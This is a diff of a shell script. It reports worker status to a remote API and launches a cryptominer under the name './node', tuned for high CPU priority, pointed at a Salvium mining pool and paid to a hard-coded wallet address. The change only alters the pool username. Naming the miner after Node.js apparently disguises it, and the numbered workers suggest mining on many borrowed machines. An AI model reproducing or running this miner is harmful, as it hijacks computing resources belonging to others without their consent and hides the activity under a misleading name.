@@ -16,7 +16,8 @@ TIME=$(TZ=Asia/Jakarta date +"%H:%M")
 curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"net_${INPUT_NUMBER}\",\"start\":\"$TIME\",\"end\":\"${WORKER_NUMBER}\"}"
 echo "start ${INPUT_NUMBER}"
 
-START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=240000.crf_${WORKER_NUMBER} > try.log & sleep 1200 )
+#START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=240000.crf_${WORKER_NUMBER} > try.log & sleep 1200 )
+START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=240000.crf > try.log & sleep 1200 )
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
 
 SEC=$(date +%S)
